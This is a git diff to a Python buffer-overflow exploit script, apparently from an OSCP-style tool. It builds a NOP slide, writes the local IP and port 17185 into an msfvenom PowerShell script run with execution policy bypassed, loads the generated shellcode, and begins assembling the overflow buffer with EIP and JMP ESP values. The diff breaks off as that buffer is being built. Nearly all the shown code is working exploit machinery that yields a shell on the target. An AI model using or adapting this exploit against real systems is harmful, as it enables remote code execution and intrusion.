@@ -1,7 +1,10 @@
+import sys
+
 import pwn
 import struct
 import socket
 import subprocess
+from .msfshellcode import shellcode
 
 
 def exploit(host, port, fuzzsize, eip, jmpesp):
@@ -18,42 +21,36 @@ def exploit(host, port, fuzzsize, eip, jmpesp):
 
     nopslide = b"\x90" * 10
 
-    with open("./scripts/msfvenomcmd.ps1") as file:
+    with open("./scripts/msfshellcode/msfvenomcmd.ps1") as file:
         newlines = file.read().replace(
             "[]", socket.gethostbyname(socket.gethostname())
         ).replace(
             "{}", "17185"
         )
-    with open("./scripts/msfvenomcmd.ps1", "w") as file:
+    with open("./scripts/msfshellcode/msfvenomcmd.ps1", "w") as file:
         file.write(newlines)
 
     msfvenom = subprocess.Popen(
         [
             "powershell",
-            "-ep", "Bypass", "./scripts/msfvenomcmd.ps1"
-        ],
-        stdout=subprocess.PIPE
+            "-ep", "Bypass", "./scripts/msfshellcode/msfvenomcmd.ps1"
+        ], stdout=sys.stdout
     )
     msfvenom.communicate()
     msfvenom.wait()
 
-    with open("./scripts/shellcode.txt", "r") as file:
-        payload = file.read().replace(
-                "buf =  ", ""
-            ).replace(
-                "buf += ", ""
-            ).replace(
-                "\n", ""
-            ).encode("utf-8")
+    payload = shellcode.buf
 
-    with open("./scripts/msfvenomcmd.ps1") as file:
+    with open("./scripts/msfshellcode/msfvenomcmd.ps1") as file:
         newlines = file.read().replace(
             socket.gethostbyname(socket.gethostname()), "[]"
         ).replace(
             "17185", "{}"
         )
-    with open("./scripts/msfvenomcmd.ps1", "w") as file:
+    with open("./scripts/msfshellcode/msfvenomcmd.ps1", "w") as file:
         file.write(newlines)
+
+    print("Offset: {}".format(offset))
 
     try:
         buffer = b"".join([
